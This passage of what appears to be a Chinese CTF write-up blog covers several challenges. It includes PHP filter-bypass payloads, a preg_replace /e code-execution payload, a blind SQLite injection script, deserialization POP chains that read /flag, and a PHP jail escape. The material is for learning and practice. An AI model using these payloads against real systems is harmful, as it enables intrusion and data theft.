&#123;         $file = $_GET[&quot;file&quot;];         echo &quot;Neeeeee! Good Job!&lt;br&gt;&quot;;    &#125; &#125; else die(&#x27;fxck you! What do you want to do ?!&#x27;);\n\n我们需要在正则匹配的情况下并且不能等于匹配语句，我们之前使用在行头使用%0a的方法去绕过正则匹配。但是这次我们需要让正则匹配和严格比较不匹配\n在 PHP 中，松散匹配 (==) 和严格匹配 (===) 对于包含回车符 (\\r)、换行符 (\\n) 等空白字符的字符串比较有显著区别。\n严格匹配会完全比较字符串内容和类型，包括所有空白字符\n松散匹配会先进行类型转换，然后比较值。对于字符串，它会忽略字符串末尾的空白字符差异\ndebu=aqua_is_cute%0a//正则匹配的是行头和行尾，回车不会打乱匹配，但是严格比较会比较回车\n\n\n\n第三层\nif($_REQUEST) &#123;     foreach($_REQUEST as $value) &#123;         if(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value))              die(&#x27;fxck you! I hate English!&#x27;);     &#125; &#125; \n\n这个要我们的值不能包含字母，这绝对不能让他得逞\n有一个规定就是，我们POST和GET传入相同变量名的时候$_REQUEST中会以POST变量优先，我们只需要在POST中传入相同变量名就可以绕过$_REQUEST\n第四层\nif ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;    extract($_GET[&quot;flag&quot;]);    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;&#125; else&#123;    die(&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;);&#125;\n\n这个我们需要像之前的md5一样sha1()也是一个加密函数，加密结果严格匹配相等，但是原始数据松散匹配不相等\nsha1()和MD5一样当参数为数组时加密结果为0，我们只需要传入数组\nshana[]=1&amp;passwd[]=2\n\n\n\n第五层\nif(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $code) || preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\&#123;|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\&quot;|\\&#x27;|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log|\\^/i&#x27;, $arg) ) &#123;     die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;); &#125; else &#123;     include &quot;flag.php&quot;;    $code(&#x27;&#x27;, $arg); &#125; \n\n这个也是这个题目最难的一层，我们需要在$arg被过滤的情况下我们利用这个代码$code(&#39;&#39;, $arg);实现拿到flag\n有一个空的参数，我们就想到之前代码执行偶尔使用到的一个函数creat_function()\ncreat_function()\nstring create_function ( string $arg , string $code )//$arg作为我们函数的参数  $code则是函数的代码 第二个参数相当于eval$newfunc = create_function(&#x27;$a, $b&#x27;, &#x27;return $a + $b;&#x27;);echo $newfunc(2, 3);//实际上就相当于function($arg)&#123;$code    &#125;//这样就给了我们闭合的机会\n\n由于我们创造的函数未被调用，所以我们还是以闭合为主\n但是我们的两个变量不是通过GET和POST获取的，我们可以看这段代码\nextract($_GET[&quot;flag&quot;]);//我们通过flag数组传递这两个变量 让变量实例化\n\nflag[code]=creat_function&amp;flag[arg]=&#125;var_dump(get_defined_vars())////我们将其放入代码中就成了function()&#123;&#125;var_dump(get_defined_vars());//&#125;//我们就完美的执行了代码\n\n\n\n最后\n最后也是最难的一步了，就是将上面的五层绕过结合为一个payload\npayload\n//GET?%66%69%6C%65=%64%61%74%61%3A%2F%2F%74%65%78%74%2F%70%6C%61%69%6E%2C%64%65%62%75%5F%64%65%62%75%5F%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5F%69%73%5F%63%75%74%65%0A&amp;%73%68%61%6E%61[]=%31&amp;%70%61%73%73%77%64[]=%32&amp;%66%6C%61%67[%63%6F%64%65]=%63%72%65%61%74%65%5F%66%75%6E%63%74%69%6F%6E&amp;%66%6C%61%67[%61%72%67]=%7D%76%61%72%5F%64%75%6D%70%28%67%65%74%5F%64%65%66%69%6E%65%64%5F%76%61%72%73%28%29%29%3B%2F%2F//本来只需要把被过滤的关键词给url编码了，但是为了方便我们全部url编码即可//POST%66%69%6C%65=1&amp;%64%65%62%75=2\n\n我们成功拿到了变量，但是flag并不在flag.php里面。我们拿到\n[&quot;ffffffff11111114ggggg&quot;]=&gt; string(89) &quot;Baka, do you think it&#x27;s so easy to get my flag? I hid the real flag in rea1fl4g.php 23333&quot; &#125;\n\n我们尝试访问rea1fl4g.php\n\n\n看来我们还是需要通过代码去读取raa1fl4g.php\n我们把之前读取变量的代码，改为读取文件即可\nflag[code]=creat_function&amp;flag[arg]=&#125;require(php://filter/convert.base64-encode/resource=rea1fl4g.php)//\n\npayload\n?%66%69%6C%65=%64%61%74%61%3A%2F%2F%74%65%78%74%2F%70%6C%61%69%6E%2C%64%65%62%75%5F%64%65%62%75%5F%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5F%69%73%5F%63%75%74%65%0A&amp;%73%68%61%6E%61[]=%31&amp;%70%61%73%73%77%64[]=%32&amp;%66%6C%61%67[%63%6F%64%65]=%63%72%65%61%74%65%5F%66%75%6E%63%74%69%6F%6E&amp;%66%6C%61%67[%61%72%67]=?%66%69%6C%65=%64%61%74%61%3A%2F%2F%74%65%78%74%2F%70%6C%61%69%6E%2C%64%65%62%75%5F%64%65%62%75%5F%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5F%69%73%5F%63%75%74%65%0A&amp;%73%68%61%6E%61[]=%31&amp;%70%61%73%73%77%64[]=%32&amp;%66%6C%61%67[%63%6F%64%65]=%63%72%65%61%74%65%5F%66%75%6E%63%74%69%6F%6E&amp;%66%6C%61%67[%61%72%67]=%7D%76%61%72%5F%64%75%6D%70%28%67%65%74%5F%64%65%66%69%6E%65%64%5F%76%61%72%73%28%29%29%3B%2F%2F//本来只需要把被过滤的关键词给url编码了，但是为了方便我们全部url编码即可//POST%66%69%6C%65=1&amp;%64%65%62%75=2\n\n又发现一个严重的问题，我们代码中有关键词被过滤掉了，我们需要通过取反去绕过这个关键词过滤\necho urlencode(~&#x27;php://filter/read=convert.base64-encode/resource=rea1fl4g.php&#x27;);//这个取反得用php去执行取反的url编码//%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F\n\n最后的payload\n?%66%69%6C%65=%64%61%74%61%3A%2F%2F%74%65%78%74%2F%70%6C%61%69%6E%2C%64%65%62%75%5F%64%65%62%75%5F%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5F%69%73%5F%63%75%74%65%0A&amp;%73%68%61%6E%61[]=%31&amp;%70%61%73%73%77%64[]=%32&amp;%66%6C%61%67[%63%6F%64%65]=%63%72%65%61%74%65%5F%66%75%6E%63%74%69%6F%6E&amp;%66%6C%61%67[%61%72%67]=?%66%69%6C%65=%64%61%74%61%3A%2F%2F%74%65%78%74%2F%70%6C%61%69%6E%2C%64%65%62%75%5F%64%65%62%75%5F%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5F%69%73%5F%63%75%74%65%0A&amp;%73%68%61%6E%61[]=%31&amp;%70%61%73%73%77%64[]=%32&amp;%66%6C%61%67[%63%6F%64%65]=%63%72%65%61%74%65%5F%66%75%6E%63%74%69%6F%6E&amp;%66%6C%61%67[%61%72%67]=&#125;require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f)); %3B%2F%2F//由于require没被过滤，我们可以直接使用  记得要加上闭合符 和注释符//POST%66%69%6C%65=1&amp;%64%65%62%75=2\n\n最后我们拿到base64编码，我们解码就行了\n\n"},{"title":"[BSidesCF_2019]Sequel","url":"/2025/06/14/BSidesCF-2019-Sequel/","content":"[BSidesCF_2019]Sequel进入界面发现是一个登录界面，网站标题为Sequel Movie Database，看见database就提示我们这题为sql，便以为这个登录框存在sql注入。尝试登录发现用户名和密码只能由数字和字母组成。\n看了wp发现这个考的是爆破，使用字典爆破出来用户名和密码都为guest，登录进去显示如下界面\n\n\n翻译了一下发现和flag没什么关系，查看cookie发现存在\n\n\n将这个cookie的值拿去解码发现为\n&#123;&quot;username&quot;:&quot;guest&quot;,&quot;password&quot;:&quot;guest&quot;&#125;\n\n也就是说我们的输入会变为cookie发送过去，于是注入点找到了。\n由于是这个题目使用的数据库是sqlite，sqlite里没有if&#x2F;chr&#x2F;asc和MySQL中的注入方式有点不一样\n我不是很懂语法于是就拿大佬的脚本来看看\n#爆类似information.schemaimport requestsimport base64import stringimport sysout = &quot;&quot;while True:    for letter in string.printable:        tmp = out + letter        payload = r&#x27;&#123;&#123;&quot;username&quot;:&quot;\\&quot; OR EXISTS(SELECT name FROM sqlite_master WHERE name LIKE \\&quot;&#123;&#125;\\&quot; limit 1) OR \\&quot;&quot;,&quot;password&quot;:&quot;guest&quot;&#125;&#125;&#x27;.format(tmp + &#x27;%&#x27;)        payload = base64.b64encode(payload.encode(&#x27;utf-8&#x27;)).decode(&#x27;utf-8&#x27;)        r = requests.get(&#x27;https://sequel-9cba4c8e.challenges.bsidessf.net/sequels&#x27;, cookies=&#123;&quot;1337_AUTH&quot; : payload&#125;)        if &quot;Movie&quot; in r.text:            out = tmp            sys.stdout.write(letter)            sys.stdout.flush()            break\n\nsqlite_master就相当于MySQL的information.schema。\npayload中的转义双引号是为了，在符合json格式的同时，让拼接到sql语句中的为&quot; OR EXISTS(SELECT name FROM sqlite_master WHERE name LIKE \\&quot;&#123;&#125;\\&quot; limit 1) OR &quot;，最外面的两个双引号应该是为了闭合原来语句\n还有需要注意的就是需要进行\npayload = base64.b64encode(payload.encode(&#x27;utf-8&#x27;)).decode(&#x27;utf-8&#x27;)\n\n将字符串Payload进行Base64编码，我们都直到base64编码方式是需要精确到字节的，但是在Python中字符串并不是像C语言中由一个个字节拼起来\nPython明确区分：\n\n字符串（str）：表示Unicode文本（如 &quot;你好&quot;）。\n字节（bytes）：表示原始二进制数据（如 b&quot;\\xe4\\xbd\\xa0\\xe5\\xa5\\xbd&quot;）。\n\n于是我们先需要进行payload.encode(&#39;utf-8&#39;)以utf-8的编码方式转化为字节，然后对其进行base64.b64encode对字节进行base64编码，最后使用decode(&#39;utf-8&#39;)，使用utf-8的编码方式再转化为字符串。\n最后爆出来\nnotes reviews reviews sqlite userinfo\n\n我们猜测表名为userinfo进行继续爆\nimport requestsimport base64import stringimport sysout = &quot;&quot;while True:    for letter in string.printable:        tmp = out + letter        if letter == &#x27;g&#x27;: continue        payload = r&#x27;&#123;&#123;&quot;username&quot;:&quot;\\&quot; OR EXISTS(SELECT username FROM userinfo WHERE username LIKE \\&quot;&#123;&#125;\\&quot; limit 1) OR \\&quot;&quot;,&quot;password&quot;:&quot;guest&quot;&#125;&#125;&#x27;.format(tmp + &#x27;%&#x27;)        payload = base64.b64encode(payload.encode(&#x27;utf-8&#x27;)).decode(&#x27;utf-8&#x27;)        r = requests.get(&#x27;https://sequel-9cba4c8e.challenges.bsidessf.net/sequels&#x27;, cookies=&#123;&quot;1337_AUTH&quot; : payload&#125;)        if &quot;Movie&quot; in r.text:            out = tmp            sys.stdout.write(letter)            sys.stdout.flush()            break\n\n最后爆出\nusername:sequeladminpassword:f5ec3af19f0d3679e7d5a148f4ac323d\n\n再进行登录即可获得flag\n"},{"title":"[BJDCTF2020]ZJCTF，不过如此","url":"/2025/06/01/BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/","content":"[BJDCTF2020]ZJCTF，不过如此&lt;?phperror_reporting(0);$text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;I have a dream&quot;))&#123;    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;    if(preg_match(&quot;/flag/&quot;,$file))&#123;        die(&quot;Not now!&quot;);    &#125;    include($file);  //next.php    &#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;\n\n源码很简单，一看就是用data和php伪协议，我们先用data伪协议绕过file_gei_contents再用php伪协议进行文件包含，过滤掉了flag，然后提示我们包含next.php\n?text=data://text/plain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php\n\n我们进行解码拿到\n&lt;?php$id = $_GET[&#x27;id&#x27;];$_SESSION[&#x27;id&#x27;] = $id;function complex($re, $str) &#123;    return preg_replace(        &#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,        &#x27;strtolower(&quot;\\\\1&quot;)&#x27;,        $str    );&#125;foreach($_GET as $re =&gt; $str) &#123;    echo complex($re, $str). &quot;\\n&quot;;&#125;function getFlag()&#123;    @eval($_GET[&#x27;cmd&#x27;]);&#125;\n\n看了之后发现突破口就在getFlag函数，但是不知道怎么调用，没想到NSS的题目我也不会还是个三星\n但是我们仔细看这个代码，我之所以找不到突破口和这个preg_replace有关系，这个正则后面跟了一个/e，这是以前没见过的，看了wp发现这是preg_replace的可执行模式\n可执行模式\n当使用 /e 修饰符时，替换字符串会被当作 PHP 代码来执行：\n$string = &#x27;April 15, 2003&#x27;;$pattern = &#x27;/(\\w+) (\\d+), (\\d+)/i&#x27;;$replacement = &#x27;$&#123;1&#125;1,$3&#x27;; // 可以被执行echo preg_replace($pattern, $replacement, $string);// 输出: April1,2003\n\n在这种模式下：\n\n替换字符串中的反向引用（如 \\1 或 $&#123;1&#125;）会被匹配的子模式替换\n然后整个替换字符串会被当作 PHP 代码通过 eval() 执行\n执行结果作为最终的替换值\n\n在 PHP 的 preg_replace 函数中，替换字符串（replacement）中的 \\1 或 $&#123;1&#125; 是反向引用（back reference），用于引用正则表达式捕获的子模式。\n\n\\1 形式：\n\\1 表示第一个捕获的子模式（第一个括号捕获的内容）\n\\2 表示第二个捕获的子模式，以此类推\n\n\n$&#123;1&#125; 形式：\n这是更明确的写法，功能与 \\1 相同\n当后面需要紧跟数字时特别有用（如 $&#123;1&#125;23）\n\n\n\n$string = &quot;Hello World&quot;;$pattern = &#x27;/(\\w+) (\\w+)/&#x27;; // 捕获两个单词$replacement = &#x27;\\2, \\1&#x27;;    // 交换位置echo preg_replace($pattern, $replacement, $string);// 输出: World, Hello\n\n\n\n在知道了preg_replace的执行模式后，我们再回来看代码\nfunction complex($re, $str) &#123;    return preg_replace(        &#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,        &#x27;strtolower(&quot;\\\\1&quot;)&#x27;,        $str    );&#125;\n\n将我们输入的参数，键作为正则匹配，值则被匹配然后输出，然后由于是可执行模式会将我们匹配到的第一个进行命令执行\n于是这就好搞了，直接匹配全部，然后值进行命令执行即可\npayload\n\\S*=&#123;&#123;getFlag()&#125;&#125;&amp;cmd=system(&#x27;env&#x27;);\n\n我们解释下这个payload，假设传入\n\\S*=$&#123;PHPinfo()&#125;\n\n\n\n\npreg_replace 的 /e 修饰符执行过程：\n正则表达式 /(\\S*)/ei 匹配输入（如 cmd=$&#123;phpinfo()&#125;），\\1 捕获 $&#123;phpinfo()&#125;。\n替换字符串 &#39;strtolower(&quot;\\\\1&quot;)&#39; 变成 strtolower(&quot;$&#123;phpinfo()&#125;&quot;)。\n由于 /e 修饰符，PHP 会先解析 $&#123;phpinfo()&#125;，执行 phpinfo()，然后再尝试 strtolower()。\n\n\n\n然后就利用eval执行命令变成了\neval(strtolower(&quot;$&#123;phpinfo()&#125;&quot;));\n\n\n\n虽然代码上是爆红了，但是还是成功执行了，好一个php\n"},{"title":"[BSidesCF_2020]Cards","url":"/2025/06/12/BSidesCF-2020-Cards/","content":"[BSidesCF_2020]Cards终于写到一个不用代码审计的题目了。\n\n\n进入，界面是一个较21点的纸牌游戏，但是我没玩过这个游戏不说，看说明半天也没明白。\n感觉这个游戏其实挺无聊的，不知道哪些人在玩。\n根据情况来看，我是闲家，我的操作就是当我受伤的点数没到21点时我可以继续要牌，直到大于或等于21点则比较，如果大于21点则爆牌算我输，反之则赢\n如果两边都是21点则比谁的牌大\n当我们赢了后会回显一个Blackjack\n解题的核心在于每次我们开始一局游戏都会请求一个SecretState参数用来保存游戏状态，并且在客户端和服务端同步。这个参数没法篡改。每次请求，服务端都会生成一个新的SecretState，但是旧的SecretState并不失效，问题就出在于此。\n游戏如果赢了，就更新SecretState，如果输了，则不更新SecretState。这样就可以达到类似一种分数只增不减的效果。\n但是有个问题，下注之后要开牌的话，必须得用新的SecretState，而下注的时候分数已经扣了，这样输的状态依然存在。\n这就需要利用21点里一个规则，如果先发的2张牌已经是21点（black jack），则直接赢。这种状态下可以省去开牌那一步。\n首先在这个url下面获取一个secret，因为后面在出牌的时候需要使用\n我们进行抓包，发现发往&#x2F;api\n我们直接用脚本发包\nimport requestsstart = &quot;http://e39a61d0-62aa-41d7-89d8-d180f2a0e35f.node5.buuoj.cn:81/api&quot;deal = start + &quot;/deal&quot;# 开局state = requests.post(start).json()[&quot;SecretState&quot;]while True:    # 下注    try:        resp = requests.post(deal, json=&#123;&quot;Bet&quot;: 500, &quot;SecretState&quot;: state&#125;).json()    except:        continue    if resp[&#x27;GameState&#x27;] == &#x27;Blackjack&#x27;:    #若游戏状态显示Blackjack则保存SecretState，以便接着来        state = resp[&#x27;SecretState&#x27;]    print(resp[&#x27;Balance&#x27;])#余额    if resp[&#x27;Balance&#x27;] &gt; 100000:#余额大于100000显示flag        print(resp)        break\n\n\n"},{"title":"BaseCTF","url":"/2025/03/18/BaseCTF/","content":"BaseCTF2024新生赛前言这学长发给我的一个新手赛，估计和4月份的新生赛差不多，遇到了很多简单的题目，但我还是写不出，就来这写下题解吧\n1.ez_ser简单的反序列化入门，根本不简单\n&lt;?phphighlight_file(__FILE__);error_reporting(0);class re&#123;    public $chu0;    public function __toString()&#123;        if(!isset($this-&gt;chu0))&#123;            return &quot;I can not believes!&quot;;        &#125;        $this-&gt;chu0-&gt;$nononono;    &#125;&#125;class web &#123;    public $kw;    public $dt;    public function __wakeup() &#123;        echo &quot;lalalla&quot;.$this-&gt;kw;    &#125;    public function __destruct() &#123;        echo &quot;ALL Done!&quot;;    &#125;&#125;class pwn &#123;    public $dusk;    public $over;    public function __get($name) &#123;        if($this-&gt;dusk != &quot;gods&quot;)&#123;            echo &quot;什么，你竟敢不认可?&quot;;        &#125;        $this-&gt;over-&gt;getflag();    &#125;&#125;class Misc &#123;    public $nothing;    public $flag;    public function getflag() &#123;        eval(&quot;system(&#x27;cat /flag&#x27;);&quot;);    &#125;&#125;class Crypto &#123;    public function __wakeup() &#123;        echo &quot;happy happy happy!&quot;;    &#125;    public function getflag() &#123;        echo &quot;you are over!&quot;;    &#125;&#125;$ser = $_GET[&#x27;ser&#x27;];unserialize($ser);?&gt; \n\n这个题目和我以前遇到的题目都不一样，之前根本没这么多类，开始绕起来了\n面对反序列化，我们首先需要找到会自动执行的魔术方法，这里是_wakeup，我们就以wakeup为线索推下去\n&lt;?phpclass re&#123;    public $chu0;    public function __toString()&#123;        if(!isset($this-&gt;chu0))&#123;            return &quot;I can not believes!&quot;;        &#125;        $this-&gt;chu0-&gt;$nononono;    &#125;&#125;class web &#123;    public $kw;    public $dt;    public function __wakeup() &#123;        echo &quot;lalalla&quot;.$this-&gt;kw;    &#125;    public function __destruct() &#123;        echo &quot;ALL Done!&quot;;    &#125;&#125;class pwn &#123;    public $dusk;    public $over;    public function __get($name) &#123;        if($this-&gt;dusk != &quot;gods&quot;)&#123;            echo &quot;什么，你竟敢不认可?&quot;;        &#125;        $this-&gt;over-&gt;getflag();    &#125;&#125;class Misc &#123;    public $nothing;    public $flag;    public function getflag() &#123;        eval(&quot;system(&#x27;cat /flag&#x27;);&quot;);    &#125;&#125;class Crypto &#123;    public function __wakeup() &#123;        echo &quot;happy happy happy!&quot;;    &#125;    public function getflag() &#123;        echo &quot;you are over!&quot;;    &#125;&#125;$a=new re();$b=new web();$c=new pwn();$d=new Misc();//把需要用到的类全部定义一遍$c-&gt;dusk=&#x27;gods&#x27;;$c-&gt;over=$d;//我们再对get()方法进行绕过，让其触发Misc的getflag()$b-&gt;kw=$a;//wakeup触发时会将kw作为字符串，将re()类赋值给kw，触发tostring方法$a-&gt;chu0=$c;//tostring方法访问了$this-&gt;chu0-&gt;$nononono;相当于$this-&gt;chu0访问$nononono这个未定义变量，我们把$c赋值给chu0触发get()方法echo serialize([$a,$b,$c,$d]);\n\n2.1z_php这个题目是我写的第一个中等难度的题目，一点都不1z，我感觉把我php考完了\n &lt;?phphighlight_file(&#x27;index.php&#x27;);# 我记得她...好像叫flag.php吧？$emp=$_GET[&#x27;e_m.p&#x27;];$try=$_POST[&#x27;try&#x27;];if($emp!=&quot;114514&quot;&amp;&amp;intval($emp,0)===114514)&#123;    for ($i=0;$i&lt;strlen($emp);$i++)&#123;        if (ctype_alpha($emp[$i]))&#123;            die(&quot;你不是hacker？那请去外场等候！&quot;);        &#125;    &#125;    echo &quot;只有真正的hacker才能拿到flag！&quot;.&quot;&lt;br&gt;&quot;;    if (preg_match(&#x27;/.+?HACKER/is&#x27;,$try))&#123;        die(&quot;你是hacker还敢自报家门呢？&quot;);    &#125;    if (!stripos($try,&#x27;HACKER&#x27;) === TRUE)&#123;        die(&quot;你连自己是hacker都不承认，还想要flag呢？&quot;);    &#125;    $a=$_GET[&#x27;a&#x27;];    $b=$_GET[&#x27;b&#x27;];    $c=$_GET[&#x27;c&#x27;];    if(stripos($b,&#x27;php&#x27;)!==0)&#123;        die(&quot;收手吧hacker，你得不到flag的！&quot;);    &#125;    echo (new $a($b))-&gt;$c();&#125;else&#123;    die(&quot;114514到底是啥意思嘞？。？&quot;);&#125;# 觉得困难的话就直接把shell拿去用吧，不用谢~$shell=$_POST[&#x27;shell&#x27;];eval($shell);?&gt;只有真正的hacker才能拿到flag！PD9waHAgPUJhc2VDVEZ7YWU5OTVlMTQtMDExZC00YTMyLWI2YjMtZGIzOGQ5NzQwM2YxfT8+Cg==\n\n这道题目的考点主要是php参数名的替换，intval()特性，正则溢出，php内置类的调用，命令执行\n先来一个胜利结算画面，这是使用两种方法拿到flag，分别是内置类的调用和命令执行\n\n\n参数名特殊字符的替换\n我就说这次的参数名字怎么这么奇怪，原来有个大坑，我一直以为我intval()没过\n在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、+、点、[转换为下划线，但是用一个特性是可以绕过的，就是当[提前出现后，后面的点就不会再被转义了，such as：CTF[SHOW.COM&#x3D;&gt;CTF_SHOW.COM\n也就是说，字符转化只会进行一次，我们想要.保留下来，只需要在前面进行一次转化即可(只有’[‘才可以)\n我就说为什么是e_m.p\npayload:\ne[m.p=114514.1\n\nintval()绕过\n这个绕过十分简单，这题参数设置还是0(会根据我们传入数字的进制进行转换比较)我们使用八进制和小数点都可以绕过\n正则溢出\n正则表达式只能匹配字符串前100万位，我们只需要生成100万个填充字符，然后在后面加上HAKER即可\nphp内置类的调用\necho (new $a($b))-&gt;$c();\n\n这个代码会先实例化类，$a作为内置类名，$b作为参数，$c作为调用内置函数\n我们只能先去看题解了\nimport requestsres = requests.post(&quot;http://gz.imxbt.cn:20391/?e[m.p=114514.1&amp;a=SplFileObject&amp;b=php://filter/read=convert.base64-encode/resource=flag.php&amp;c=__toString&quot;,data = &#123;&quot;try&quot;:&quot;-&quot;*1000001+&quot;HACKER&quot;&#125;)print(res.text)\n\n\n\n3.Really EZ POP看名字这是一个反序列化的题目，做完以后感觉自己还是得练\n &lt;?phphighlight_file(__FILE__);class Sink&#123;    private $cmd = &#x27;echo 123;&#x27;;    public function __toString()    &#123;        eval($this-&gt;cmd);        //目标为触发Sink的__toString    &#125;&#125;class Shark&#123;    private $word = &#x27;Hello, World!&#x27;;    //由于是private属性，不能在外面赋值，也不能直接赋值new Sink()。我们只能使用函数等函数被调用的时候直接赋值变量    public function __invoke()    &#123;        echo &#x27;Shark says:&#x27; . $this-&gt;word;        //这里可以触发__toString，现在需要触发__invoke()    &#125;&#125;class Sea&#123;    public $animal;    public function __get($name)    &#123;        $sea_ani = $this-&gt;animal;        echo &#x27;In a deep deep sea, there is a &#x27; . $sea_ani();        //变量后面加括号典型的作为函数使用，可以触发__invoke()    &#125;&#125;class Nature&#123;    public $sea;    public function __destruct()    &#123;        echo $this-&gt;sea-&gt;see;        //这里see是未知变量，我们让Sea去访问触发__get()    &#125;&#125;if ($_POST[&#x27;nature&#x27;]) &#123;    $nature = unserialize($_POST[&#x27;nature&#x27;]);&#125; BaseCTF&#123;30143b77-4491-4d0f-9e95-84ef008fde17&#125; \n\n我们在反序列化时，虽然只保留变量进行序列化，但是我们在比如__construct()等魔术方法时需要注意进行赋值等操作\npop链的构造\n&lt;?phpclass Sink&#123;    private $cmd = &#x27;system(&quot;cat /flag&quot;);&#x27;;    public function __toString()    &#123;        eval($this-&gt;cmd);    &#125;&#125;class Shark&#123;    private $word = &#x27;&#x27;;    public function __construct()&#123;        $this-&gt;word=new Sink();        //写一个__construct函数去赋值，话说为什么这样可以     &#125;    public function __invoke()    &#123;        echo &#x27;Shark says:&#x27; . $this-&gt;word;    &#125;&#125;class Sea&#123;    public $animal;    public function __get($name)    &#123;        $sea_ani = $this-&gt;animal;        echo &#x27;In a deep deep sea, there is a &#x27; . $sea_ani();    &#125;&#125;class Nature&#123;    public $sea;    public function __destruct()    &#123;        echo $this-&gt;sea-&gt;see;    &#125;&#125;$shark = new Shark();$sea = new Sea();$nature = new Nature();$nature-&gt;sea=$sea;$sea-&gt;animal = $shark;echo urlencode(serialize($nature));//由于pop链把所有类串起来了，所以只需要序列化一个类即可\n\n\n\n4.ez_php_jail&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;hint.html&quot;);$Jail = $_GET[&#x27;Jail_by.Happy&#x27;];if($Jail == null) die(&quot;Do You Like My Jail?&quot;);function Like_Jail($var) &#123;    if (preg_match(&#x27;/(`|\\$|a|c|s|require|include)/i&#x27;, $var)) &#123;        return false;    &#125;    return true;&#125;if (Like_Jail($Jail)) &#123;    eval($Jail);    echo &quot;Yes! you escaped from the jail! LOL!&quot;;&#125; else &#123;    echo &quot;You will Jail in your life!&quot;;&#125;echo &quot;\\n&quot;;// 在HTML解析后再输出PHP源代码?&gt;\n\n这个题目看起来就是php特性和命令执行，但仔细一看，正则表达式好像把system,passthru,exec,反引号等命令执行函数全都禁掉了，甚至我们都不能用cat去读取文件，所以命令执行估计是不行了\n1.glob()glob() 是 PHP 中用于查找匹配指定模式的文件路径的函数，类似于在命令行中使用通配符查找文件。\narray glob ( string $pattern [, int $flags = 0 ] )\n\n   参数说明\n\n$pattern：搜索的模式（支持通配符）\n* 匹配任意数量的任意字符\n? 匹配任意单个字符\n[...] 匹配括号内的任意一个字符\n\n\n$flags：可选标志，可以是以下值的组合：\nGLOB_MARK - 在每个返回的项目中加一个斜杠\nGLOB_NOSORT - 按照文件在目录中出现的原始顺序返回\nGLOB_NOCHECK - 如果没有文件匹配则返回搜索的模式\nGLOB_NOESCAPE - 反斜线不转义元字符\nGLOB_BRACE - 扩充 {a,b,c} 来匹配 ‘a’, ‘b’ 或 ‘c’\nGLOB_ONLYDIR - 仅返回与模式匹配的目录项\nGLOB_ERR - 停止并读取错误信息（比如不可读的目录）\n\n\n\n这个函数返回值是一个数组，我们只需要知道这个可以在php中使用通配符进行查找就行了，至于数组下的具体内容是我们找到文件的具体路径，感觉就是字符串\n所以这个题目需要搭配另外一个很熟悉的函数highlight_file()去把我们找到的文件读出来\n首先我们需要知道flag在哪，我们可以用下面这个方法去查看文件目录\n?Jail[by.Happy=print_r(glob(&quot;*&quot;));//查看网站根目录?Jail[by.Happy=print_r(glob(&quot;/*&quot;));//成功找到flag\n\n\n\n找到之后直接用highlight_file去读取即可\n?Jail[by.Happy=highlight_file(glob(&quot;/f*&quot;)[0]);\n\n\n\n5.滤个不停&lt;?phphighlight_file(__FILE__);error_reporting(0);$incompetent = $_POST[&#x27;incompetent&#x27;];$Datch = $_POST[&#x27;Datch&#x27;];if ($incompetent !== &#x27;HelloWorld&#x27;) &#123;    die(&#x27;写出程序员的第一行问候吧！&#x27;);&#125;//这是个什么东东？？？$required_chars = [&#x27;s&#x27;, &#x27;e&#x27;, &#x27;v&#x27;, &#x27;a&#x27;, &#x27;n&#x27;, &#x27;x&#x27;, &#x27;r&#x27;, &#x27;o&#x27;];$is_valid = true;foreach ($required_chars as $char) &#123;    if (strpos($Datch, $char) === false) &#123;        $is_valid = false;        break;    &#125;&#125;if ($is_valid) &#123;    $invalid_patterns = [&#x27;php://&#x27;, &#x27;http://&#x27;, &#x27;https://&#x27;, &#x27;ftp://&#x27;, &#x27;file://&#x27; , &#x27;data://&#x27;, &#x27;gopher://&#x27;];    foreach ($invalid_patterns as $pattern) &#123;        if (stripos($Datch, $pattern) !== false) &#123;            die(&#x27;此路不通换条路试试?&#x27;);        &#125;    &#125;    include($Datch);&#125; else &#123;    die(&#x27;文件名不合规 请重试&#x27;);&#125;?&gt; 